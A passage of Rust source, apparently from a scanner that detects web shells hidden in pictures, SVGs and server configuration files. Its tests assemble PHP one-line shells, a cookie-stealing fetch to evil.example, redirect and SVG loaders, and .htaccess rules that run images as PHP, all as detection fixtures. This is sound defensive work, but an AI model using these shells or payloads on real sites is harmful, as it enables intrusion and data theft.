        if let Some(off) = JS_OBFUSCATION.iter().find_map(|n| find(n.as_bytes())) {
            acc.add("js-obfuscation", 50, Some(off));
        }
        if let Some(off) = JS_EXFIL_REDIRECT.iter().find_map(|n| find(n.as_bytes())) {
            acc.add("js-exfil-redirect", 30, Some(off));
        }
    }
}

/// Text at the very end of a real picture: whatever follows the image data.
/// Picture data ends in binary, so a run of text there was added.
fn trailing_text(content: &[u8]) -> &[u8] {
    let floor = content.len().saturating_sub(65_536);
    let mut i = content.len();
    while i > floor && is_text_byte(content[i - 1]) {
        i -= 1;
    }
    content[i..].trim_ascii()
}

/// Score a file named like a picture. `content` is the whole file, or, for a
/// large one, its first and last parts joined (a payload sits in the metadata at
/// the start or is appended at the end).
#[must_use]
pub fn score_image(name: &str, content: &[u8]) -> Score {
    let name = name.to_ascii_lowercase();
    let low: Vec<u8> = content.iter().map(u8::to_ascii_lowercase).collect();
    let kind = sniff(content);
    let mut acc = Acc::default();

    if double_extension(&name) {
        acc.add("double-extension", 40, None);
    }
    match kind {
        Kind::Executable => acc.add("executable-as-image", 100, Some(0)),
        Kind::Archive => acc.add("archive-as-image", 70, Some(0)),
        Kind::Text => acc.add("text-in-image-name", 40, Some(0)),
        Kind::Image | Kind::Svg | Kind::Other => {}
    }

    // Code in the file. The PHP scorer reads just the code around the tag.
    let allow_short = matches!(kind, Kind::Text | Kind::Svg);
    if let Some(off) = find_php_open_low(&low, allow_short) {
        acc.add("php-in-image", 70, Some(off));
        let seg = text_segment(content, off, 8192);
        let inner = score_php(&seg, false, false);
        for h in inner.hits {
            acc.add(h.rule, h.weight, None);
        }
        acc.context = masked_snippet(content, off);
    }
    score_markup(&mut acc, &low);

    // Something after the end of a real picture.
    if kind == Kind::Image {
        let tail = trailing_text(content);
        if tail.len() >= 32 && looks_like_text(tail) {
            acc.add("appended-text", 40, Some(content.len() - tail.len()));
            let tail_low = tail.to_ascii_lowercase();
            let has = |n: &[u8]| memchr::memmem::find(&tail_low, n).is_some();
            if JS_OBFUSCATION.iter().any(|n| has(n.as_bytes()))
                || JS_EXFIL_REDIRECT.iter().any(|n| has(n.as_bytes()))
                || has(b"base64_decode")
                || has(b"<script")
            {
                acc.add("appended-code", 40, None);
            }
        }
    }
    acc.finish(content)
}

// ---- files that make pictures run as code ---------------------------------

/// Does this handler or type run code (PHP, CGI) rather than serve a file?
fn runs_code(handler: &str) -> bool {
    ["php", "cgi-script", "fcgid-script", "lsapi"]
        .iter()
        .any(|n| handler.contains(n))
}

/// Does a `<FilesMatch>`/`<Files>` header name picture files?
fn names_an_image(header: &str) -> bool {
    [
        "jpg", "jpeg", "png", "gif", "webp", "ico", "bmp", "svg", "image",
    ]
    .iter()
    .any(|n| header.contains(n))
}

fn unquote(v: &str) -> &str {
    v.trim().trim_matches(|c| c == '"' || c == '\'')
}

/// Where `auto_prepend_file` / `auto_append_file` points. A security plugin
/// points it at a PHP file of its own, so only a target that is not PHP at all,
/// or PHP in a folder that holds uploads or temporary files, is reported.
fn auto_include(acc: &mut Acc, value: &str, line: &str) {
    let v = unquote(value);
    if v.is_empty() || v == "none" {
        return;
    }
    let file = v.rsplit('/').next().unwrap_or(v);
    let ext = file.rsplit_once('.').map_or("", |(_, e)| e);
    if PHP_LIKE_EXTS.contains(&ext) {
        let odd = ["/uploads/", "/cache/", "/tmp/", "/wp-content/upgrade/"]
            .iter()
            .any(|p| v.contains(p))
            || v.contains("/.");
        if odd {
            acc.add("config-auto-include-odd-path", 80, None);
            acc.context = line.chars().take(160).collect();
        }
    } else {
        acc.add("config-auto-include-nonphp", 100, None);
        acc.context = line.chars().take(160).collect();
    }
}

fn htaccess_line(acc: &mut Acc, line: &str, in_image_block: &mut bool) {
    if let Some(rest) = line
        .strip_prefix("<filesmatch")
        .or_else(|| line.strip_prefix("<files"))
    {
        *in_image_block = names_an_image(rest);
        return;
    }
    if line.starts_with("</files") {
        *in_image_block = false;
        return;
    }
    let mut words = line.split_whitespace();
    match words.next().unwrap_or("") {
        "addhandler" | "addtype" => {
            if !words.next().is_some_and(runs_code) {
                return;
            }
            for ext in words {
                let ext = unquote(ext).trim_start_matches('.');
                if IMAGE_EXTS.contains(&ext) {
                    acc.add("config-image-as-code", 100, None);
                    acc.context = line.chars().take(160).collect();
                    return;
                }
                if DATA_EXTS.contains(&ext) {
                    acc.add("config-data-as-code", 60, None);
                    acc.context = line.chars().take(160).collect();
                    return;
                }
            }
        }
        "sethandler" | "forcetype" => {
            if *in_image_block && words.next().is_some_and(runs_code) {
                acc.add("config-image-as-code", 100, None);
                acc.context = line.chars().take(160).collect();
            }
        }
        "php_value" | "php_admin_value" => {
            if matches!(words.next(), Some("auto_prepend_file" | "auto_append_file")) {
                auto_include(acc, words.next().unwrap_or(""), line);
            }
        }
        _ => {}
    }
}

fn ini_line(acc: &mut Acc, line: &str) {
    let Some((key, value)) = line.split_once('=') else {
        return;
    };
    let value = value.split(';').next().unwrap_or("");
    match key.trim() {
        "auto_prepend_file" | "auto_append_file" => auto_include(acc, value, line),
        "allow_url_include" if matches!(unquote(value), "on" | "1" | "true" | "yes") => {
            acc.add("config-allow-url-include", 50, None);
            acc.context = line.chars().take(160).collect();
        }
        _ => {}
    }
}

/// Score a server configuration file that can turn pictures into code:
/// `.htaccess`, `.user.ini`, `php.ini`. `name` is the file name.
#[must_use]
pub fn score_config(name: &str, content: &[u8]) -> Score {
    let name = name.to_ascii_lowercase();
    let text = String::from_utf8_lossy(content).to_ascii_lowercase();
    let mut acc = Acc::default();
    let mut in_image_block = false;
    for raw in text.lines() {
        let line = raw.trim();
        if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
            continue;
        }
        if name == ".htaccess" {
            htaccess_line(&mut acc, line, &mut in_image_block);
        } else {
            ini_line(&mut acc, line);
        }
    }
    acc.finish(content)
}

#[cfg(test)]
mod tests {
    use super::*;

    // Fixtures are assembled from fragments so this source file never contains
    // a contiguous web-shell byte signature.
    fn cat(parts: &[&str]) -> Vec<u8> {
        parts.concat().into_bytes()
    }
    fn verdict(src: &[u8]) -> Verdict {
        score_php(src, false, false).verdict
    }

    // ---- things that must be caught ------------------------------------

    #[test]
    fn classic_one_line_shell_is_malicious() {
        let src = cat(&["<?php ", "sys", "tem(", "$_", "GET['c']); ?>"]);
        let s = score_php(&src, false, false);
        assert_eq!(s.verdict, Verdict::Malicious, "hits={:?}", s.hits);
    }

    #[test]
    fn eval_of_decoded_input_is_malicious() {
        let src = cat(&[
            "<?php ",
            "ev",
            "al(",
            "base64_",
            "decode(",
            "$_",
            "POST['x'])); ",
        ]);
        assert_eq!(verdict(&src), Verdict::Malicious);
    }

    #[test]
    fn input_chosen_as_the_function_name_is_malicious() {
        // The request supplies both the function and its argument.
        let src = cat(&["<?php ", "$_", "POST['f'](", "$_", "POST['a']); ?>"]);
        let s = score_php(&src, false, false);
        assert_eq!(s.verdict, Verdict::Malicious, "hits={:?}", s.hits);
        assert!(s.hits.iter().any(|h| h.rule == "input-as-function"));
    }

    #[test]
    fn input_via_a_variable_is_suspicious_but_not_auto_cleanable() {
        let src = cat(&["<?php $c = ", "$_", "GET['c']; ", "sys", "tem($c);"]);
        let s = score_php(&src, false, false);
        assert_eq!(s.verdict, Verdict::Suspicious, "hits={:?}", s.hits);
        assert!(s.hits.iter().any(|h| h.rule == "tainted-to-sink"));
    }

    #[test]
    fn preg_replace_with_the_e_modifier_is_flagged() {
        let src = cat(&["<?php ", "preg_replace('/.*/e', ", "$_", "POST['x'], '');"]);
        assert!(
            score_php(&src, false, false)
                .hits
                .iter()
                .any(|h| h.rule == "preg_replace-e")
        );
    }

    #[test]
    fn php_in_uploads_raises_the_score() {
        let src = cat(&["<?php echo 'hi'; @include(", "$_", "REQUEST['f']);"]);
        let base = score_php(&src, false, false).score;
        let upload = score_php(&src, true, false).score;
        assert!(upload > base);
    }

    // ---- false positives seen on real WordPress/WooCommerce/Elementor code --

    #[test]
    fn wordpress_callback_dispatch_next_to_a_post_check_is_clean() {
        // The pattern that flagged wp-admin/includes/ajax-actions.php: a callback
        // registry called with call_user_func_array, and $_POST nearby.
        let src = br#"<?php
		ob_start();
			call_user_func_array( $control['callback'], $control['params'] );
		ob_end_clean();
		break;
	}
	if ( isset( $_POST['sidebar'] ) ) { $x = sanitize_text_field( $_POST['sidebar'] ); }
"#;
        assert_eq!(verdict(src), Verdict::Clean);
    }

    #[test]
    fn only_the_function_to_call_matters_for_call_user_func() {
        // WooCommerce: a value read from the form is passed to a registered
        // callback as DATA. Legitimate.
        let data = cat(&[
            "<?php $value = $_",
            "POST['v']; call_user_func( $field['update_callback'], $field['id'], $value );",
        ]);
        assert_eq!(verdict(&data), Verdict::Clean);
        // ...but when the request names the function to run, it is a shell.
        let shell = cat(&["<?php call_user_", "func(", "$_", "GET['f'], 1);"]);
        assert_eq!(verdict(&shell), Verdict::Malicious);
        let via_var = cat(&["<?php $f = $_", "GET['f']; call_user_", "func($f, 1);"]);
        assert_eq!(verdict(&via_var), Verdict::Suspicious);
    }

    #[test]
    fn a_tainted_variable_used_as_a_table_key_is_clean() {
        // WordPress/Elementor: the request picks an entry of a registered table.
        let src = cat(&[
            "<?php $name = $_",
            "GET['import']; call_user_func( $registry[ $name ][2] );",
        ]);
        assert_eq!(verdict(&src), Verdict::Clean);
    }

    #[test]
    fn taint_follows_simple_wrappers_and_indexing_of_the_tainted_array() {
        let wrapped = cat(&["<?php $c = trim($_", "POST['c']); ", "sys", "tem($c);"]);
        assert_eq!(verdict(&wrapped), Verdict::Suspicious);
        let whole = cat(&["<?php $d = $_", "POST; ", "sys", "tem($d['cmd']);"]);
        assert_eq!(verdict(&whole), Verdict::Suspicious);
    }

    #[test]
    fn a_check_or_sanitized_value_does_not_taint() {
        // `isset(...) ? ..` is a test, `intval(...)` is a number.
        let check = cat(&[
            "<?php $v = isset($_",
            "GET['x']) ? 1 : 2; call_user_func( $v );",
        ]);
        assert_eq!(verdict(&check), Verdict::Clean);
        let num = cat(&["<?php $n = intval($_", "GET['n']); ", "sys", "tem($n);"]);
        assert_eq!(verdict(&num), Verdict::Clean);
    }

    #[test]
    fn what_follows_a_call_is_not_its_argument() {
        // Laravel's ParallelTesting: a callback called in one branch of a ternary
        // and request input read in the other. Flagged "malicious" in the field.
        let src = cat(&[
            "<?php return $this->tokenResolver ? call_user_func($this->tokenResolver) : ($_",
            "SERVER['TEST_TOKEN'] ?? false);",
        ]);
        assert_eq!(verdict(&src), Verdict::Clean);
        // Input inside the call is still a shell, whatever brackets sit in quotes.
        let shell = cat(&["<?php ", "sys", "tem(\")\" . $_", "GET['c']);"]);
        assert_eq!(verdict(&shell), Verdict::Malicious);
        let open = cat(&["<?php ", "sys", "tem(\"x(\" . $_", "GET['c']);"]);
        assert_eq!(verdict(&open), Verdict::Malicious);
        let nested = cat(&["<?php ", "ev", "al(base64_decode(trim($_", "POST['x'])));"]);
        assert_eq!(verdict(&nested), Verdict::Malicious);
    }

    fn has(src: &[u8], rule: &str) -> bool {
        score_php(src, false, false)
            .hits
            .iter()
            .any(|h| h.rule == rule)
    }

    #[test]
    fn prose_in_a_comment_is_not_input_called_as_a_function() {
        // phpQuery's docblock, flagged "malicious" in the field.
        let doc = cat(&[
            "<?php class A { /** Dot '.' means $_",
            "SERVER['HTTP_HOST'] (if any). */ public static $x = array('.'); }",
        ]);
        assert_eq!(verdict(&doc), Verdict::Clean);
        // A real call keeps matching, whatever the first argument looks like.
        for tail in [
            "GET['f']('id');",
            "GET['f'](\"id\");",
            "REQUEST['f'](trim($x));",
            "POST['f']($_POST['a']);",
            "GET['f']();",
            "GET['f'](@$a);",
        ] {
            let src = cat(&["<?php $_", tail]);
            assert!(has(&src, "input-as-function"), "{tail}");
        }
    }

    #[test]
    fn a_command_on_decoded_input_is_a_shell() {
        let plain = cat(&["<?php $c = $_", "POST['c']; sys", "tem($c);"]);
        assert_eq!(verdict(&plain), Verdict::Suspicious);
        let decoded = cat(&["<?php $c = base64_decode($_", "POST['c']); sys", "tem($c);"]);
        assert!(has(&decoded, "decoded-to-sink"));
        assert_eq!(verdict(&decoded), Verdict::Malicious);
        // Through more than one wrapper.
        let nested = cat(&[
            "<?php $c = trim(base64_decode($_",
            "POST['c'])); exe",
            "c($c);",
        ]);
        assert_eq!(verdict(&nested), Verdict::Malicious);
    }

    #[test]
    fn a_command_that_folds_its_errors_into_the_page_is_a_shell() {
        // The theme `404.php` webshell found in the field.
        let shell = cat(&[
            "<?php $c = $_",
            "POST['c']; if($c!==null){ob_start();@pass",
            "thru($c.' 2>&1');$o=ob_get_clean();echo \"[S]\".$o.\"[E]\";} exit; ?>",
        ]);
        assert!(has(&shell, "tainted-command-capture"));
        assert_eq!(verdict(&shell), Verdict::Malicious);
        // Without the error folding it is the weaker, reported case.
        let weaker = cat(&["<?php $c = $_", "POST['c']; pass", "thru($c);"]);
        assert_eq!(verdict(&weaker), Verdict::Suspicious);
        // A tool building its own command (PHPUnit) is neither.
        let tool = cat(&[
            "<?php $s = $_",
            "SERVER['argv']; $p = proc_open($this->getCommand($s, $this->temp), $spec, $pipes);",
        ]);
        assert_eq!(verdict(&tool), Verdict::Suspicious);
    }

    #[test]
    fn test_tooling_is_never_called_malicious_on_weak_signs_alone() {
        // A command call, an argument from `$_SERVER` and a write to disk add up
        // to 130: the verdict that makes `sn clean` quarantine PHPUnit's phar.
        let weak = cat(&[
            "<?php $s = $_",
            "SERVER['argv']; $p = proc_open($this->cmd($s), $spec, $pipes); file_put_",
            "contents($_",
            "SERVER['x'], 'y');",
        ]);
        let mut s = score_php(&weak, false, false);
        assert_eq!(s.verdict, Verdict::Malicious, "{:?}", s.hits);
        assert!(s.score >= 100);
        cap_without_strong_rule(&mut s);
        assert_eq!(s.verdict, Verdict::Suspicious);
        assert_eq!(s.score, 99);
        assert!(s.hits.iter().any(|h| h.rule == "known-dev-tool"));
        // With a strong rule in it, the verdict stays.
        let mut strong = score_php(&cat(&["<?php ev", "al($_", "POST['x']);"]), false, false);
        cap_without_strong_rule(&mut strong);
        assert_eq!(strong.verdict, Verdict::Malicious);
        // And what was not "malicious" is left alone.
        let mut clean = score_php(b"<?php echo 1;", false, false);
        cap_without_strong_rule(&mut clean);
        assert_eq!(clean.verdict, Verdict::Clean);
        assert!(clean.hits.is_empty());
    }

    #[test]
    fn wp_filesystem_is_not_the_system_call() {
        let src = cat(&[
            "<?php if ( ! WP_Filesystem( $credentials ) ) { ",
            "$h = $_",
            "POST['hostname']; request_filesystem_credentials( $url ); }",
        ]);
        assert_eq!(verdict(&src), Verdict::Clean);
    }

    #[test]
    fn method_calls_are_not_sinks() {
        let src = cat(&["<?php $pdo->", "ex", "ec($sql); $v = $_", "POST['a'];"]);
        assert_eq!(verdict(&src), Verdict::Clean);
        let src = cat(&["<?php Foo::", "sys", "tem($_", "GET['x']);"]);
        assert_eq!(verdict(&src), Verdict::Clean);
    }

    #[test]
    fn a_function_definition_is_not_a_call() {
        let src = cat(&[
            "<?php function ",
            "ex",
            "ec($cmd) { return $_",
            "GET['a']; }",
        ]);
        assert_eq!(verdict(&src), Verdict::Clean);
    }

    #[test]
    fn preg_replace_callback_and_plain_modifiers_are_clean() {
        let cb = br#"<?php $x = preg_replace_callback( '/ELEMENTOR_([A-Z]+)/', function ( $m ) { return $m[1]; }, $css );"#;
        assert_eq!(verdict(cb), Verdict::Clean);
        let plain = br#"<?php $x = preg_replace( '/foo/i', 'bar', $s ); // the old preg_replace(//e) form is gone"#;
        assert_eq!(verdict(plain), Verdict::Clean);
    }

    #[test]
    fn backticks_in_comments_are_clean() {
        let src = b"<?php\n/**\n * Quotes `$text` and also `$other`.\n */\nfunction f() {}\n";
        assert_eq!(verdict(src), Verdict::Clean);
    }

    #[test]
    fn request_input_in_ordinary_code_is_clean() {
        let src = br#"<?php
		if ( isset( $_POST['action'] ) && wp_verify_nonce( $_POST['_wpnonce'], 'save' ) ) {
			update_option( 'name', sanitize_text_field( $_POST['name'] ) );
			wp_redirect( add_query_arg( 'saved', 1, $_SERVER['REQUEST_URI'] ) );
		}"#;
        assert_eq!(verdict(src), Verdict::Clean);
    }

    #[test]
    fn plain_wordpress_theme_code_is_clean() {
        let src = br#"<?php
        function my_theme_setup() {
            add_theme_support('post-thumbnails');
            register_nav_menus(array('primary' => __('Primary Menu')));
        }
        add_action('after_setup_theme', 'my_theme_setup');
        "#;
        let s = score_php(src, false, false);
        assert_eq!(
            s.verdict,
            Verdict::Clean,
            "score={} hits={:?}",
            s.score,
            s.hits
        );
    }

    #[test]
    fn commercial_encoders_are_their_own_class() {
        let src = cat(&["<?php //ionCube Loader\n", "$data = 'AAAA';"]);
        // No decode/eval rules fire, so this is not malicious either way.
        assert_ne!(verdict(&src), Verdict::Malicious);
    }

    // ---- pictures -------------------------------------------------------

    /// Deterministic bytes that look like compressed picture data.
    fn noise(n: usize, seed: u64) -> Vec<u8> {
        let mut x = seed;
        (0..n)
            .map(|_| {
                x = x
                    .wrapping_mul(6364136223846793005)
                    .wrapping_add(1442695040888963407);
                (x >> 33) as u8
            })
            .collect()
    }

    const JPEG_HEAD: &[u8] = &[0xFF, 0xD8, 0xFF, 0xE0, 0, 16, b'J', b'F', b'I', b'F', 0];
    const JPEG_END: &[u8] = &[0xFF, 0xD9];
    const PNG_HEAD: &[u8] = &[0x89, b'P', b'N', b'G', 0x0D, 0x0A, 0x1A, 0x0A];
    const PNG_END: &[u8] = &[0, 0, 0, 0, b'I', b'E', b'N', b'D', 0xAE, 0x42, 0x60, 0x82];

    fn picture(head: &[u8], middle: &[u8], end: &[u8]) -> Vec<u8> {
        let mut v = head.to_vec();
        v.extend(noise(6000, 7));
        v.extend(middle);
        v.extend(noise(6000, 11));
        v.extend(end);
        v
    }

    fn img(name: &str, bytes: &[u8]) -> Score {
        score_image(name, bytes)
    }

    fn has_rule(s: &Score, rule: &str) -> bool {
        s.hits.iter().any(|h| h.rule == rule)
    }

    #[test]
    fn a_shell_inside_a_real_jpeg_is_malicious() {
        let shell = cat(&["<?php ", "sys", "tem(", "$_", "GET['c']); ?>"]);
        let s = img("logo.jpg", &picture(JPEG_HEAD, &shell, JPEG_END));
        assert_eq!(s.verdict, Verdict::Malicious, "hits={:?}", s.hits);
        assert!(has_rule(&s, "php-in-image") && has_rule(&s, "source-to-sink"));
        assert!(s.context.contains("<?php"), "{}", s.context);
    }

    #[test]
    fn a_shell_behind_a_gif_header_is_malicious() {
        let mut v = b"GIF89a;".to_vec();
        v.extend(cat(&["<?php ", "ev", "al(", "$_", "POST['x']);"]));
        assert_eq!(img("a.gif", &v).verdict, Verdict::Malicious);
    }

    #[test]
    fn plain_php_in_a_picture_is_suspicious_for_a_human() {
        let s = img("x.png", &picture(PNG_HEAD, b"<?php echo 1; ?>", PNG_END));
        assert_eq!(s.verdict, Verdict::Suspicious, "hits={:?}", s.hits);
    }

    #[test]
    fn the_open_tag_is_found_in_any_case() {
        let s = img("x.png", &picture(PNG_HEAD, b"<?PHP echo 1; ?>", PNG_END));
        assert!(has_rule(&s, "php-in-image"));
        let short = img(
            "x.jpg",
            &picture(JPEG_HEAD, b"<?= $a; echo $b; ?>", JPEG_END),
        );
        assert!(has_rule(&short, "php-in-image"));
    }

    #[test]
    fn chance_bytes_in_picture_data_are_not_a_php_tag() {
        // `<?=` and `<?` + space turn up by chance in compressed data; what
        // follows is binary, not code.
        let chance: &[u8] = b"<?=\x00\x81\x9c\xfe\x13\xaa\xbb\xcc\xdd\xee\xff\x01\x02\x03\x04";
        let s = img("photo.jpg", &picture(JPEG_HEAD, chance, JPEG_END));
        assert_eq!(s.verdict, Verdict::Clean, "hits={:?}", s.hits);
        let sp: &[u8] = b"<? \x00\x81\x9c\xfe\x13\xaa\xbb\xcc\xdd\xee\xff\x01\x02\x03\x04";
        assert_eq!(
            img("photo.jpg", &picture(JPEG_HEAD, sp, JPEG_END)).verdict,
            Verdict::Clean
        );
    }

    #[test]
    fn a_few_text_bytes_after_a_chance_tag_are_still_not_code() {
        // Seen in a real PNG among 223,000 pictures: `<?=` and a dozen printable
        // bytes of compressed data. Nothing in it ends a statement.
        let chance: &[u8] = b"<?=a~=b9-( gXr\x00\x81\x9c\xfe\x13\xaa\xbb\xcc\xdd\xee\xff\x01\x02";
        let s = img("photo.png", &picture(PNG_HEAD, chance, PNG_END));
        assert_eq!(s.verdict, Verdict::Clean, "hits={:?}", s.hits);
        // A short tag with a real statement still counts.
        let real: &[u8] = b"<?= $_GET['a']; ?>\x00\x81\x9c";
        assert!(has_rule(
            &img("a.png", &picture(PNG_HEAD, real, PNG_END)),
            "php-in-image"
        ));
    }

    #[test]
    fn xmp_metadata_is_not_php() {
        let xmp = br#"<?xpacket begin="" id="W5M0"?><x:xmpmeta xmlns:x="adobe:ns:meta/"></x:xmpmeta><?xpacket end="w"?>"#;
        let s = img("a.jpg", &picture(JPEG_HEAD, xmp, JPEG_END));
        assert_eq!(s.verdict, Verdict::Clean, "hits={:?}", s.hits);
    }

    #[test]
    fn a_text_file_named_like_a_picture_is_a_php_file_in_disguise() {
        let v = cat(&["<?php ", "ev", "al(", "$_", "POST['x']);"]);
        let s = img("avatar.jpg", &v);
        assert_eq!(s.verdict, Verdict::Malicious);
        assert!(has_rule(&s, "text-in-image-name"));
        // The short tag counts in text.
        let short = img("a.png", b"<? echo 'this page is not an image at all'; ?>");
        assert!(has_rule(&short, "php-in-image"));
    }

    #[test]
    fn a_program_named_like_a_picture_is_malicious() {
        let mut elf = b"\x7fELF\x02\x01\x01".to_vec();
        elf.extend(noise(300, 3));
        assert_eq!(img("bg.jpg", &elf).verdict, Verdict::Malicious);
        let script = b"#!/usr/bin/perl\nuse Socket; print 'connect back to the server';\n";
        assert_eq!(img("bg.png", script).verdict, Verdict::Malicious);
    }

    #[test]
    fn an_archive_named_like_a_picture_is_reported() {
        let mut zip = b"PK\x03\x04".to_vec();
        zip.extend(noise(300, 5));
        assert_eq!(img("kit.jpg", &zip).verdict, Verdict::Suspicious);
    }

    #[test]
    fn an_html_page_named_like_a_picture_is_judged_by_its_script() {
        let broken = b"<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1></body></html>";
        assert_eq!(
            img("a.jpg", broken).verdict,
            Verdict::Clean,
            "a saved error page"
        );
        let skimmer = cat(&[
            "<html><script>var u = atob('aHR0cHM6Ly9ldmlsLmV4YW1wbGU='); ",
            "window.location = u;</script></html>",
        ]);
        let s = img("a.jpg", &skimmer);
        assert_eq!(s.verdict, Verdict::Malicious, "hits={:?}", s.hits);
    }

    #[test]
    fn a_plain_svg_is_clean_and_a_scripted_one_is_not() {
        let plain = br#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5z"/></svg>"#;
        assert_eq!(img("icon.svg", plain).verdict, Verdict::Clean);
        let loader = cat(&[
            "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>",
            "ev",
            "al(atob('YWxlcnQoMSk=')); document.location='https://x.example/';</script></svg>",
        ]);
        let s = img("logo.svg", &loader);
        assert_eq!(s.verdict, Verdict::Malicious, "hits={:?}", s.hits);
        let handler = cat(&[
            "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"",
            "ev",
            "al(atob('YWxlcnQoMSk='))\"></svg>",
        ]);
        assert_eq!(img("a.svg", &handler).verdict, Verdict::Suspicious);
        // A handler alone is a test page, not an attack.
        let alert = br#"<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>"#;
        assert_eq!(img("a.svg", alert).verdict, Verdict::Clean);
    }

    #[test]
    fn script_words_without_a_script_are_not_counted() {
        let svg =
            br#"<svg xmlns="http://www.w3.org/2000/svg"><text>fetch( the atob( word</text></svg>"#;
        assert_eq!(img("a.svg", svg).verdict, Verdict::Clean);
    }

    #[test]
    fn script_in_a_pictures_metadata_is_reported() {
        let xss = cat(&[
            "<script src=\"https://evil.example/x.js\"></script>",
            "<script>fetch('https://evil.example/c?'+document.cookie)</script>",
        ]);
        let s = img("a.jpg", &picture(JPEG_HEAD, &xss, JPEG_END));
        assert!(s.verdict != Verdict::Clean, "hits={:?}", s.hits);
        assert!(has_rule(&s, "remote-script"));
    }

    #[test]
    fn text_added_after_the_end_of_a_picture() {
        // Padding that says nothing: only a note, not a verdict.
        let pad = "x1y2z3".repeat(20);
        let s = img(
            "a.png",
            &picture(PNG_HEAD, b"", &[PNG_END, pad.as_bytes()].concat()),
        );
        assert!(has_rule(&s, "appended-text") && !has_rule(&s, "appended-code"));
        assert_eq!(s.verdict, Verdict::Clean);
        // A loader behind the picture.
        let loader = cat(&[
            "var s=String.fromCharCode(104,116,116,112); document.write(unescape('%3Cb%3E'));",
        ]);
        let s = img(
            "a.png",
            &picture(PNG_HEAD, b"", &[PNG_END, &loader].concat()),
        );
        assert_eq!(s.verdict, Verdict::Suspicious, "hits={:?}", s.hits);
        assert!(has_rule(&s, "appended-code"));
    }

    #[test]
    fn a_photo_with_binary_after_the_image_is_clean() {
        // Phones append a video or a trailer after the JPEG; it is binary.
        let mut tail = b"\x00\x00\x00\x18ftypmp42".to_vec();
        tail.extend(noise(2000, 9));
        let s = img(
            "IMG_1.jpg",
            &picture(JPEG_HEAD, b"", &[JPEG_END, &tail].concat()),
        );
        assert_eq!(s.verdict, Verdict::Clean, "hits={:?}", s.hits);
        let s = img(
            "IMG_2.jpg",
            &picture(JPEG_HEAD, b"", &[JPEG_END, b"\n"].concat()),
        );
        assert_eq!(s.verdict, Verdict::Clean);
    }

    #[test]
    fn a_script_name_part_before_the_picture_extension() {
        assert!(double_extension("shell.php.jpg"));
        assert!(double_extension("a.phtml.png"));
        assert!(!double_extension("my.photo.jpg"));
        assert!(!double_extension("photo.jpg"));
        let real = picture(JPEG_HEAD, b"", JPEG_END);
        assert_eq!(img("shell.php.jpg", &real).verdict, Verdict::Clean);
        assert!(has_rule(&img("shell.php.jpg", &real), "double-extension"));
        let fake = b"just some text standing in for a picture, long enough to read";
        assert_eq!(img("shell.php.jpg", fake).verdict, Verdict::Suspicious);
    }

    #[test]
    fn empty_and_tiny_pictures_are_clean() {
        assert_eq!(img("a.gif", b"").verdict, Verdict::Clean);
        assert_eq!(
            img("a.gif", b"GIF89a\x01\x00\x01\x00").verdict,
            Verdict::Clean
        );
    }

    #[test]
    fn the_php_marker_for_files_opened_by_recency() {
        assert!(has_php_marker(b"<?PHP echo 1;"));
        assert!(has_php_marker(b"<?php\necho 1;"));
        assert!(has_php_marker(b"<? echo 1; ?>"));
        assert!(has_php_marker(b"<?= $x ?>"));
        assert!(!has_php_marker(b"<?xml version=\"1.0\"?><a/>"));
        assert!(!has_php_marker(b"just some text"));
        assert!(!has_php_marker(b"<? \x00\x01\x02\x03\x04\x05\x06\x07"));
    }

    // ---- configuration that makes pictures run as code ------------------

    fn cfg(name: &str, text: &str) -> Score {
        score_config(name, text.as_bytes())
    }

    #[test]
    fn mapping_pictures_to_php_is_malicious() {
        let s = cfg(".htaccess", "AddHandler application/x-httpd-php .jpg\n");
        assert_eq!(s.verdict, Verdict::Malicious);
        assert!(has_rule(&s, "config-image-as-code"));
        assert!(s.context.contains("addhandler"), "{}", s.context);
        assert_eq!(
            cfg(
                ".htaccess",
                "AddType application/x-httpd-php .php .png .gif"
            )
            .verdict,
            Verdict::Malicious
        );
        let block = "<FilesMatch \"\\.(jpg|png|gif)$\">\n  SetHandler application/x-httpd-php\n</FilesMatch>\n";
        assert_eq!(cfg(".htaccess", block).verdict, Verdict::Malicious);
        let cgi = "<Files shell.jpg>\n  ForceType application/x-httpd-php\n</Files>\n";
        assert_eq!(cfg(".htaccess", cgi).verdict, Verdict::Malicious);
        // A commented line does nothing.
        assert_eq!(
            cfg(".htaccess", "# AddHandler application/x-httpd-php .jpg\n").verdict,
            Verdict::Clean
        );
    }

    #[test]
    fn ordinary_htaccess_files_are_clean() {
        let wp = "# BEGIN WordPress\n<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule . /index.php [L]\n</IfModule>\n# END WordPress\n";
        assert_eq!(cfg(".htaccess", wp).verdict, Verdict::Clean);
        let fpm = "<FilesMatch \\.php$>\n  SetHandler \"proxy:unix:/run/php/php8.2-fpm.sock|fcgi://localhost\"\n</FilesMatch>\n";
        assert_eq!(cfg(".htaccess", fpm).verdict, Verdict::Clean);
        let cpanel = "AddHandler application/x-httpd-ea-php74___lsphp .php .php7 .phtml\n";
        assert_eq!(cfg(".htaccess", cpanel).verdict, Verdict::Clean);
        let html = "AddHandler application/x-httpd-php .html .htm\n";
        assert_eq!(cfg(".htaccess", html).verdict, Verdict::Clean);
        let types = "AddType image/webp .webp\nAddType application/javascript .js\n";
        assert_eq!(cfg(".htaccess", types).verdict, Verdict::Clean);
        let deny = "<FilesMatch \"\\.(jpg|png)$\">\n  Header set Cache-Control \"max-age=86400\"\n</FilesMatch>\n";
        assert_eq!(cfg(".htaccess", deny).verdict, Verdict::Clean);
    }

    #[test]
    fn mapping_plain_data_to_php_is_reported() {
        let s = cfg(".htaccess", "AddHandler application/x-httpd-php .txt\n");
        assert!(has_rule(&s, "config-data-as-code"));
    }

    #[test]
    fn a_prepended_picture_is_malicious() {
        let s = cfg(
            ".user.ini",
            "auto_prepend_file = /home/u/public_html/a/logo.jpg\n",
        );
        assert_eq!(s.verdict, Verdict::Malicious);
        assert!(has_rule(&s, "config-auto-include-nonphp"));
        assert_eq!(
            cfg(
                ".htaccess",
